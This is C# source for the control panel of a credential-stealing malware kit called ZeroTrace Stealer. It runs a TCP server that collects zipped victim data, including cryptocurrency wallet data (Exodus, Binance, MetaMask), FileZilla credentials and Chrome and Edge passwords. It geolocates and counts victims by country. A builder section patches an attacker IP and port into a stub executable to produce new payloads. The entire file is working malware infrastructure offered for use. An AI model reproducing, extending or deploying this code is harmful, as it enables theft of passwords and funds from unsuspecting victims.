using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.Http;
using Microsoft.CodeAnalysis;
using System.Reflection;
using Mono.Cecil;
using System.Drawing;


namespace ZeroTrace_Stealer
{
    public partial class Form1 : DevExpress.XtraBars.FluentDesignSystem.FluentDesignForm
    {
        private TcpListener server;
        private int port;
        public Form1()
        {
            InitializeComponent();
        }
        private bool isServerRunning = false; // Track the server status
        private int currentPort = -1; // Track the current port the server is using

        private async void simpleButton1_Click(object sender, EventArgs e)
        {
            counting.Enabled = true;

            if (int.TryParse(textEdit1.Text, out port))
            {
                if (isServerRunning && port == currentPort)
                {
                    // If the server is running on the same port, inform the user
                    MessageBox.Show($"Server is already running on port {port}.");
                    return; // Prevent starting the server again
                }

                // Stop the existing server if it's running on a different port
                if (isServerRunning)
                {
                    StopServer();
                }

                // Start a new server on the desired port
                server = new TcpListener(IPAddress.Any, port);
                try
                {
                    server.Start();
                    isServerRunning = true; // Mark the server as running
                    currentPort = port; // Update the current port
                    MessageBox.Show($"Server started on port {port}.");
                    label37.Text = "Server Running...";

                    while (isServerRunning)
                    {
                        var client = await server.AcceptTcpClientAsync();
                        _ = Task.Run(() => HandleClientAsync(client));
                    }
                }
                catch (Exception ex)
                {
             
                }
            }
            else
            {
                MessageBox.Show("Invalid port number.");
            }
        }
        private void StopServer()
        {
            try
            {
                // Stop the server gracefully
                server.Stop();
                isServerRunning = false; // Mark the server as stopped
                currentPort = -1; // Reset the current port
                MessageBox.Show("Server stopped.");
            }
            catch (Exception ex)
            {
             
            }
        }
        private async Task HandleClientAsync(TcpClient client)
        {
            try
            {
                if (client == null || !client.Connected)
                    return;

                string clientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                string fileName = $"Clients\\{clientIP}.zip";
                string osInfo = "Unknown";
                string exodus = "0";
                string blockchain = "0";
                string binance = "0";
                string localmetamask = "0";

                string checkfilezilla = "0";
                string checkedgepasswords = "0";
                string checkchromepasswords = "0";
                string checkfiles = "0";



                long fileSize;

                // Get country information
                string country = await GetCountryFromIPAsync(clientIP);

                using (NetworkStream stream = client.GetStream())
                using (FileStream fs = new FileStream(fileName, FileMode.Create))
                {
                    // Read OS info length
                    byte[] osLengthBuffer = new byte[4];
                    await stream.ReadAsync(osLengthBuffer, 0, osLengthBuffer.Length);
                    int osInfoLength = BitConverter.ToInt32(osLengthBuffer, 0);

                    // Read OS info
                    byte[] osBuffer = new byte[osInfoLength];
                    await stream.ReadAsync(osBuffer, 0, osInfoLength);
                    osInfo = Encoding.UTF8.GetString(osBuffer);

                    // Read file size
                    byte[] fileSizeBuffer = new byte[8];
                    await stream.ReadAsync(fileSizeBuffer, 0, fileSizeBuffer.Length);
                    fileSize = BitConverter.ToInt64(fileSizeBuffer, 0);

                    // Read file content
                    long totalBytesRead = 0;
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while (totalBytesRead < fileSize && (bytesRead = await stream.ReadAsync(buffer, 0, (int)Math.Min(buffer.Length, fileSize - totalBytesRead))) > 0)
                    {
                        await fs.WriteAsync(buffer, 0, bytesRead);
                        totalBytesRead += bytesRead;
                    }

                    // Read message lengths and messages for exodus, blockchain, binance, and localmetamask
                    var messageHandlers = new List<(string, string)>
{
    ("Exodus", exodus),
    ("Blockchain", blockchain),
    ("Binance", binance),
    ("LocalMetaMask", localmetamask),
    ("FileZilla", checkfilezilla),
    ("EdgePasswords", checkedgepasswords),
    ("ChromePasswords", checkchromepasswords),
    ("Files", checkfiles)


};


                    foreach (var (key, value) in messageHandlers)
                    {
                        byte[] messageLengthBuffer = new byte[4];
                        await stream.ReadAsync(messageLengthBuffer, 0, messageLengthBuffer.Length);
                        int messageLength = BitConverter.ToInt32(messageLengthBuffer, 0);

                        byte[] messageBuffer = new byte[messageLength];
                        await stream.ReadAsync(messageBuffer, 0, messageLength);
                        var message = Encoding.UTF8.GetString(messageBuffer);

                        switch (key)
                        {
                            case "Exodus":
                                exodus = message;
                                if (message != "0")
                                {
                                    label43.Invoke((MethodInvoker)(() =>
                                    {
                                        label43.Text = (int.Parse(label43.Text) + 1).ToString();
                                    }));
                                }
                                break;
                            case "Blockchain":
                                blockchain = message;
                                if (message != "0")
                                {
                                    label46.Invoke((MethodInvoker)(() =>
                                    {
                                        label46.Text = (int.Parse(label46.Text) + 1).ToString();
                                    }));
                                }
                                break;
                            case "Binance":
                                binance = message;
                                if (message != "0")
                                {
                                    label49.Invoke((MethodInvoker)(() =>
                                    {
                                        label49.Text = (int.Parse(label49.Text) + 1).ToString();
                                    }));
                                }
                                break;
                            case "LocalMetaMask":
                                localmetamask = message;
                                if (message != "0")
                                {
                                    label52.Invoke((MethodInvoker)(() =>
                                    {
                                        label52.Text = (int.Parse(label52.Text) + 1).ToString();
                                    }));
                                }
                                break;

                            case "FileZilla":
                                checkfilezilla = message;
                                if (message != "0")
                                {
                                    label57.Invoke((MethodInvoker)(() =>
                                    {
                                        label57.Text = (int.Parse(label57.Text) + 1).ToString();
                                        Console.WriteLine($"Received FileZilla: {message}");

                                    }));
                                }
                                break;


                            case "EdgePasswords":
                                checkedgepasswords = message;
                                if (message != "0")
                                {
                                    label65.Invoke((MethodInvoker)(() =>
                                    {
                                        label65.Text = (int.Parse(label65.Text) + 1).ToString();


                                    }));
                                }
                                break;



                            case "ChromePasswords":
                                checkchromepasswords = message;
                                if (message != "0")
                                {
                                    label61.Invoke((MethodInvoker)(() =>
                                    {
                                        label61.Text = (int.Parse(label61.Text) + 1).ToString();


                                    }));
                                }
                                break;


                            case "Files":
                                checkfiles = message;
                                if (message != "0")
                                {
                                    label70.Invoke((MethodInvoker)(() =>
                                    {
                                        label70.Text = (int.Parse(label70.Text) + 1).ToString();


                                    }));
                                }
                                break;




                        }
                    }
                }

                // Update country count
                Invoke((MethodInvoker)(() =>
                {
                    switch (country)
                    {
                        case "US":
                            uscount.Text = (int.Parse(uscount.Text) + 1).ToString();
                            break;
                        case "IT":
                            italycount.Text = (int.Parse(italycount.Text) + 1).ToString();
                            break;
                        case "CA":
                            canadacount.Text = (int.Parse(canadacount.Text) + 1).ToString();
                            break;
                        case "DE":
                            germanycount.Text = (int.Parse(germanycount.Text) + 1).ToString();
                            break;
                        case "RO":
                            romaniacount.Text = (int.Parse(romaniacount.Text) + 1).ToString();
                            break;
                        case "SE":
                            swedencount.Text = (int.Parse(swedencount.Text) + 1).ToString();
                            break;
                        case "CN":
                            chinacount.Text = (int.Parse(chinacount.Text) + 1).ToString();
                            break;
                        default:
                            othercount.Text = (int.Parse(othercount.Text) + 1).ToString();
                            break;
                    }

                    // Update ListView
                    var item = new ListViewItem(new[]
                    {
                clientIP,
                country,
                osInfo,
                "ZIP",
                fileSize.ToString(),
                exodus,
                blockchain,
                binance,
                localmetamask,
                checkfilezilla,
                checkedgepasswords,
                checkchromepasswords,
                checkfiles
            });

                    item.ImageIndex = 0;
                    listView1.Items.Add(item);
               
                    SaveData();
                }));

                // Show received form
               // MessageBox.Show($"File and message received from {clientIP} ({country}). Message: {exodus}");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}");
            }
            finally
            {
                client?.Close();
            }
        }

        private void SaveData()
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientData.txt");

            using (StreamWriter writer = new StreamWriter(filePath, false))
            {
                // Save label values
                var labels = new[]
                {
            label2, label5, label8, label11, label43, label46, label49, label52,
            label57, label61, label65, label70, uscount, italycount, canadacount,
            germanycount, romaniacount, swedencount, chinacount, othercount
        };
                foreach (var label in labels)
                {
                    writer.WriteLine($"{label.Name}={label.Text}");
                }

                // Save ListView items
                writer.WriteLine("ListViewDataStart");
                foreach (ListViewItem item in listView1.Items)
                {
                    var line = string.Join("|", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(subItem => subItem.Text));
                    writer.WriteLine(line);
                }
                writer.WriteLine("ListViewDataEnd");
            }
        }
        private void LoadData()
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientData.txt");

            if (!File.Exists(filePath))
                return;

            using (StreamReader reader = new StreamReader(filePath))
            {
                string line;
                bool isListViewData = false;

                while ((line = reader.ReadLine()) != null)
                {
                    // Check for ListView data start and end markers
                    if (line == "ListViewDataStart")
                    {
                        isListViewData = true;
                        continue;
                    }
                    if (line == "ListViewDataEnd")
                    {
                        isListViewData = false;
                        continue;
                    }

                    if (isListViewData)
                    {
                        // Load ListView items
                        var columns = line.Split('|');
                        var item = new ListViewItem(columns);
                        item.ImageIndex = 0; // Set the image index if applicable
                        listView1.Items.Add(item);
                    }
                    else
                    {
                        // Load label values
                        var parts = line.Split('=');
                        if (parts.Length == 2)
                        {
                            string labelName = parts[0];
                            string labelValue = parts[1];

                            var label = Controls.Find(labelName, true).FirstOrDefault() as Label;
                            if (label != null)
                            {
                                label.Text = labelValue;
                            }
                        }
                    }
                }
            }
        }

        private void SaveListViewData()
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientInfos.txt");

            using (StreamWriter writer = new StreamWriter(filePath, false))
            {
                foreach (ListViewItem item in listView1.Items)
                {
                    var line = string.Join("|", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(subItem => subItem.Text));
                    writer.WriteLine(line);
                }
            }
        }


        private void LoadListViewData()
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientInfos.txt");

            if (File.Exists(filePath))
            {
                using (StreamReader reader = new StreamReader(filePath))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        var columns = line.Split('|');
                        var item = new ListViewItem(columns);
                        item.ImageIndex = 0; // Set the image index if applicable
                        listView1.Items.Add(item);
                    }
                }
            }
        }



        private async Task<string> GetCountryFromIPAsync(string ipAddress)
        {
            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    string url = $"https://ipinfo.io/{ipAddress}/json";
                    HttpResponseMessage response = await httpClient.GetAsync(url);
                    response.EnsureSuccessStatusCode();
                    string responseBody = await response.Content.ReadAsStringAsync();
                    var jsonObject = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(responseBody);
                    return jsonObject.ContainsKey("country") ? jsonObject["country"] : "Unknown";
                }
            }
            catch
            {
                return "Unknown";
            }
        }


        // Helper method to safely invoke on the UI thread
        private Task InvokeAsync(Action action)
        {
            return Task.Run(() =>
            {
                if (InvokeRequired)
                    Invoke(action);
                else
                    action();
            });
        }

        private void countlistview1_Tick(object sender, EventArgs e)
        {
            int itemCount = listView1.Items.Count;

            // Update label2 with the item count
            label2.Text = $"{itemCount}";
            label11.Text = $"{itemCount}";
        }

        // stop : 
        private void simpleButton2_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox21_Click(object sender, EventArgs e)
        {
        }

        private void counting_Tick(object sender, EventArgs e)
        {


        }

        private void Form1_Load(object sender, EventArgs e)
        {
            int length = 10;
            string randomString = GenerateRandomString(length);
            textEdit5.Text = randomString;
            LoadData();
        }

        private void Form1_Resize(object sender, EventArgs e)
        {

        }

        private void panelControl9_Paint(object sender, PaintEventArgs e)
        {

        }

        private void simpleButton13_Click(object sender, EventArgs e)
        {


            Stealerium.Builder.Build.ModifyAndSaveAssembly(textEdit3.Text, textEdit4.Text, textEdit5.Text, "Build.exe");

            MessageBox.Show("Build Success!");
       
        }

        


        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void panelControl28_Paint(object sender, PaintEventArgs e)
        {

        }

        private void accordionControlElement4_Click(object sender, EventArgs e)
        {

        }

        private void xtraTabControl1_Click(object sender, EventArgs e)
        {

        }

        private void accordionControlElement2_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 0;


        }

        private void accordionControlElement3_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 1;

        }

        private void accordionControlElement6_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 2;

        }

        private void accordionControlElement7_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 3;

        }

        private void accordionControlElement9_Click(object sender, EventArgs e)
        {
    
            Environment.Exit(1);
        }

        private void genkey_Tick(object sender, EventArgs e)
        {
            int length = 10; 
            string randomString = GenerateRandomString(length);
            textEdit5.Text = randomString;
        }


        static Random random = new Random();
        public static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            char[] stringChars = new char[length];

            for (int i = 0; i < length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new string(stringChars);
        }

        private void simpleButton14_Click(object sender, EventArgs e)
        {

        }

        private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            // Background for non-selected items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Default background color
            }

            // Highlight selected item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw text for item
            e.DrawText(TextFormatFlags.Left);
        }

        private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            // Background for non-selected sub-items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Default background color
            }

            // Highlight selected sub-item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw sub-item text
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, listView1.Font, e.Bounds, Color.White, TextFormatFlags.Left);
        }

        private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            // Column header background color
            e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Column background
            TextRenderer.DrawText(e.Graphics, e.Header.Text, listView1.Font, e.Bounds, Color.White, TextFormatFlags.Left);
        }

        private void listView2_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            // Background for non-selected items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Default background color
            }

            // Highlight selected item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw text for item
            e.DrawText(TextFormatFlags.Left);
        }

        private void listView3_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            // Background for non-selected items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Default background color
            }

            // Highlight selected item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw text for item
            e.DrawText(TextFormatFlags.Left);
        }

        private void listView4_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            // Background for non-selected items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Default background color
            }

            // Highlight selected item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw text for item
            e.DrawText(TextFormatFlags.Left);
        }

        private void listView2_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            // Background for non-selected sub-items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Default background color
            }

            // Highlight selected sub-item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw sub-item text
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, listView1.Font, e.Bounds, Color.White, TextFormatFlags.Left);
        }

        private void listView3_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            // Background for non-selected sub-items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Default background color
            }

            // Highlight selected sub-item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw sub-item text
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, listView1.Font, e.Bounds, Color.White, TextFormatFlags.Left);
        }

        private void listView4_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            // Background for non-selected sub-items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Default background color
            }

            // Highlight selected sub-item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw sub-item text
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, listView1.Font, e.Bounds, Color.White, TextFormatFlags.Left);
        }

        private void listView4_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            // Column header background color
            e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Column background
            TextRenderer.DrawText(e.Graphics, e.Header.Text, listView1.Font, e.Bounds, Color.White, TextFormatFlags.Left);
        }

        private void listView3_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            // Column header background color
            e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Column background
            TextRenderer.DrawText(e.Graphics, e.Header.Text, listView1.Font, e.Bounds, Color.White, TextFormatFlags.Left);
        }

        private void listView2_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            // Column header background color
            e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(35, 46, 64)), e.Bounds); // Column background
            TextRenderer.DrawText(e.Graphics, e.Header.Text, listView1.Font, e.Bounds, Color.White, TextFormatFlags.Left);
        }
    }
}


namespace Stealerium.Builder
{


    internal sealed class Build
    {



        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            return AssemblyDefinition.ReadAssembly(stubPath);
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }





        private static void UpdateResource(string resourceName, string newContent, AssemblyDefinition assembly)
        {
            // Find the existing resource by name
            var existingResource = assembly.MainModule.Resources.OfType<EmbeddedResource>()
                                    .FirstOrDefault(r => r.Name.Equals(resourceName));

            if (existingResource != null)
            {
                // Remove the existing resource
                assembly.MainModule.Resources.Remove(existingResource);
            }

            // Add the new resource
            var newResource = new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(newContent));
            assembly.MainModule.Resources.Add(newResource);
        }

        public static void UpdateIPAndPort(string newIP, string newPort, string genkey, AssemblyDefinition assembly)
        {
            // Remove and add the IP and Port resources
            UpdateResource("DestinyClient.Resources.ip.txt", newIP, assembly);
            UpdateResource("DestinyClient.Resources.port.txt", newPort, assembly);
            UpdateResource("DestinyClient.Resources.hwid.txt", genkey, assembly);
        }


        //public static void ModifyObfuscatedAssembly(string newIP, string newPort, string outputPath)
        //{
        //    try
        //    {
        //        string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClientObf.exe";

        //        Console.WriteLine(stubPath);
        //        Console.ReadLine();
        //        // Read the stub assembly
        //        var assembly = ReadStub(stubPath);

        //        // Update the IP and Port resources
        //        UpdateIPAndPort(newIP, newPort, assembly);

        //        // Write the modified assembly to a file
        //        WriteStub(assembly, outputPath);
        //    }
        //    catch (Exception ex)
        //    {
        //        throw new Exception($"Failed to modify assembly: {ex.Message}");
        //    }
        //}


        public static void ModifyAndSaveAssembly(string newIP, string newPort, string genkey, string outputPath)
        {
            try
            {
                string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClient.exe";

                Console.WriteLine(stubPath);
                Console.ReadLine();
                // Read the stub assembly
                var assembly = ReadStub(stubPath);

                // Update the IP and Port resources
                UpdateIPAndPort(newIP, newPort, genkey, assembly);

                // Write the modified assembly to a file
                WriteStub(assembly, outputPath);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to modify assembly: {ex.Message}");
            }
        }
    }
}
